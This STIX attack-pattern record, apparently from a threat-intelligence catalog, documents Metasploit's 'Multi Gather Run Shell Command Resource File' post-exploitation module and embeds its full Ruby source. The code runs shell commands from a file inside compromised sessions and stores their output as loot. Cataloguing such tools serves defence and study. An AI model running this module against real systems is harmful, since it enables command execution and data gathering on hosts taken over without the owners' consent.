{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65900e04-7971-4205-9209-c9094a931467",
    "created": "2024-08-14T16:33:19.157924Z",
    "modified": "2024-08-14T16:33:19.157927Z",
    "name": "Multi Gather Run Shell Command Resource File",
    "description": " This module will read shell commands from a resource file and execute the commands in the specified Meterpreter or shell session.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/multi_command.rb",
            "external_id": "multi_command.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Run Shell Command Resource File',\n        'Description' => %q{\n          This module will read shell commands from a resource file and\n          execute the commands in the specified Meterpreter or shell session.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['meterpreter']\n      )\n    )\n    register_options(\n      [\n        OptString.new('RESOURCE', [true, 'Full path to resource file to read commands from.', nil])\n\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    if !::File.exist?(datastore['RESOURCE'])\n      raise 'Resource File does not exist!'\n    else\n      ::File.open(datastore['RESOURCE'], 'rb').each_line do |cmd|\n        next if cmd.strip.empty?\n        next if cmd[0, 1] == '#'\n\n        begin\n          tmpout = \"\\n\"\n          tmpout << \"*****************************************\\n\"\n          tmpout << \"      Output of #{cmd}\\n\"\n          tmpout << \"*****************************************\\n\"\n          print_status \"Running command #{cmd.chomp}\"\n          tmpout << cmd_exec(cmd.chomp)\n          vprint_status tmpout\n          command_log = store_loot('host.command', 'text/plain', session, tmpout,\n                                   \"#{cmd.gsub(%r{\\.|/|\\s}, '_')}.txt\", \"Command Output \\'#{cmd.chomp}\\'\")\n          print_good(\"Command output saved to: #{command_log}\")\n        rescue ::Exception => e\n          print_bad(\"Error Running Command #{cmd.chomp}: #{e.class} #{e}\")\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}